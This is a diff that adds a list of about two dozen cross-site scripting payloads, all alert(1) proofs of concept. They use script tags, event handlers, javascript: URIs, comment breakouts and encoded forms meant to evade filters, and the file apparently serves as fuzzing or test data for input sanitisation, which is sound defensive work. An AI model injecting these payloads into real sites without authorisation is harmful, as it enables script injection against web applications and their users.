@@ -1,0 +1,26 @@
+<script>alert(1)</script>
+<img src=x onerror=alert(1)>
+<svg/onload=alert(1)>
+javascript:alert(1)
+"><script>alert(1)</script>
+</script><script>alert(1)</script>
+<body onload=alert(1)>
+<iframe onload=alert(1)>
+<input onfocus=alert(1) autofocus>
+<select onchange=alert(1)>
+<textarea oninput=alert(1)>
+<form onsubmit=alert(1)>
+<details ontoggle=alert(1)>
+<video src=x onerror=alert(1)>
+<audio src=x onerror=alert(1)>
+<isindex type=image src=1 onerror=alert(1)>
+<marquee onstart=alert(1)>
+<object onerror=alert(1)>
+<embed src=javascript:alert(1)>
+<style>@keyframes x{}</style><xss style="animation-name:x" onanimationend="alert(1)"></xss>
+<!--<img src="--><img src=x onerror=alert(1)//">
+%3Cscript%3Ealert(1)%3C%2Fscript%3E
+&lt;script&gt;alert(1)&lt;/script&gt;
+\u003cscript\u003ealert(1)\u003c/script\u003e
+'"><svg/onload=alert(1)>
+javascript://%250Aalert(1)//
